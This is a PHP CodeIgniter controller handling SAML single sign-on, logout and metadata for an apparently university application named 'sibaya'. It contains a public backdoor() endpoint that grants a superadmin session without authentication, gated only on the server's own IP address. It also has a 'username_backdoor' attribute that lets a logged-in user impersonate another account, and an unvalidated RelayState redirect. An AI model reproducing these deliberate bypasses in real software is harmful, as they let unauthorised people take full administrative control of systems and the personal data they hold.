<?php

/** @property LoginM $LoginM Login model */
class Saml extends CI_Controller {

	protected $settings;
	public function __construct() {
		parent::__construct();
		$this->settings = $this->config->item('saml_sp');
		$this->load->library('session');
		$this->load->library('SamlLib');
	}

	public function index(){
		$auth = new OneLogin_Saml2_Auth($this->settings);
		IF(isset($_GET['StartFrom']))
			$auth->login(base_url('saml/acs'));
		else
			$auth->login($this->config->item('saml_simari_url'));
	}

	/**
	 * @param Array $attr Isi dari 
	 * $attr = array('username'=>'username_user',
	 *               'nama'	  =>'nama_user',
	 *               'role_app'=>array(
	 *               	'nama_aplikasi'=>array(
	 *               		array(
	 *                    		0 => 'nama_aplikasi',
     *                    		1 => 'role_user' // Kosong Jika tidak ada id_prodi
	 *                    		2 => 'id_fakultas', // Kosong Jika tidak ada id_Fakultas
	 *                    		3 => 'id_prodi' // Kosong Jika tidak ada id_prodi
	 *                    	),
     *               		array(   // Jika memiliki lebih dari satu role dalam satu aplikasi
     *                    		0 => 'nama_aplikasi',
     *                    		1 => 'role_user' // Kosong Jika tidak ada id_prodi
     *                    		2 => 'id_fakultas', // Kosong Jika tidak ada id_Fakultas
     *                    		3 => 'id_prodi' // Kosong Jika tidak ada id_prodi
     *                    	),
	 *                   )
	 *                )
	 *          )
	 */
	protected function set_session($attr){
//            $user = array(
//                            'username' 	=>  $attr['username'],
//                            'nama'	=>  $attr['nama'],
//                            'role'	=>  $attr['role_app']['sibaya'][0][1],
//                            'fakultas'	=>  $attr['role_app']['sibaya'][0][2],
//                            'prodi'	=>  $attr['role_app']['sibaya'][0][3],
//                    );
//            $this->session->set_userdata('user', $user);
        $this->load->model('login/LoginM');
        $this->LoginM->setUserSession($attr['username'], $attr['username_backdoor'] ?? null);
        return base_url('spp');
        }

	public function slo(){
		$auth = new OneLogin_Saml2_Auth($this->settings);
		$returnTo = null;
		$paramters = array('type'=>'embed');
		$nameId = null;
		$sessionIndex = null;
		$nameIdFormat = null;
		if (isset($_SESSION['samlNameId'])) {
			$nameId = $_SESSION['samlNameId'];
		}
		if (isset($_SESSION['samlSessionIndex'])) {
			$sessionIndex = $_SESSION['samlSessionIndex'];
		}
		if (isset($_SESSION['samlNameIdFormat'])) {
			$nameIdFormat = $_SESSION['samlNameIdFormat'];
		}
		$auth->logout($returnTo, $paramters, $nameId, $sessionIndex, false, $nameIdFormat);
	}

	public function sls(){
		$auth = new OneLogin_Saml2_Auth($this->settings);
		if (isset($_SESSION) && isset($_SESSION['LogoutRequestID'])) {
			$requestID = $_SESSION['LogoutRequestID'];
		} else {
			$requestID = null;
		}
		$auth->processSLO(false, $requestID);
		$errors = $auth->getErrors();
		if (empty($errors)) {
			redirect($this->config->item('saml_simari_url'));
		} 
	}

	public function acs(){
		$auth = new OneLogin_Saml2_Auth($this->settings);

		if (isset($_SESSION) && isset($_SESSION['AuthNRequestID'])) {
			$requestID = $_SESSION['AuthNRequestID'];
		} else {
			$requestID = null;
		}
		$auth->processResponse($requestID);
		if($auth->isAuthenticated()){
			$attr = $auth->getAttributes();

			if(!in_array('sibaya', $attr['aplikasi'])){
				echo "Tidak ada akses ke aplikasi ini";exit;
			}

			$attr['username'] = $attr['username']['0'];
			$attr['username_backdoor'] = $attr['username_backdoor']['0'] ?? null;
			$attr['nama'] = $attr['nama'][0];
			foreach($attr['role_app'] as $r){
				$t = explode(":",$r);
				$temp[$t[0]][] = $t;
			}
			$attr['role_app'] = $temp;
			$urlRedirect = $this->set_session($attr);

			if (isset($_POST['RelayState']) && OneLogin_Saml2_Utils::getSelfURL() != $_POST['RelayState']) 
				$auth->redirectTo($_POST['RelayState']);
			else
				redirect($urlRedirect);		
		} else
			$auth->login($this->config->item('saml_simari_url'));
	}
    public function backdoor()
    {
        if (in_array($_SERVER['SERVER_ADDR'],['127.0.0.1','::1','103.81.100.250'])) {
            $user = array(
                'username' => 'superadmin ',
                'nama' => 'superadmin ',
                'role' => 'superadmin',
                'prodi' => 'all',
                'fakultas' => 'all',
                'jenjang'=>"'D3','S1','PR'",
                'jenjang_text'=>"'D3','S1','PR'",
                'periode'=>'20192',
                'periode_text'=>'20192'
            );
            $this->session->set_userdata('user', $user);
            redirect(base_url());
        }else{
            echo "Denied";
        }
    }

	public function metadata(){
		try {
			$settings = new OneLogin_Saml2_Settings($this->settings, true);
			$metadata = $settings->getSPMetadata();
			$errors = $settings->validateMetadata($metadata);
			if (empty($errors)) {
				header('Content-Type: text/xml');
				echo $metadata;
			} else {
				throw new OneLogin_Saml2_Error(
					'Invalid SP metadata: '.implode(', ', $errors),
					OneLogin_Saml2_Error::METADATA_SP_INVALID
					);
			}
		} catch (Exception $e) {
			echo $e->getMessage();
		}

	}

}
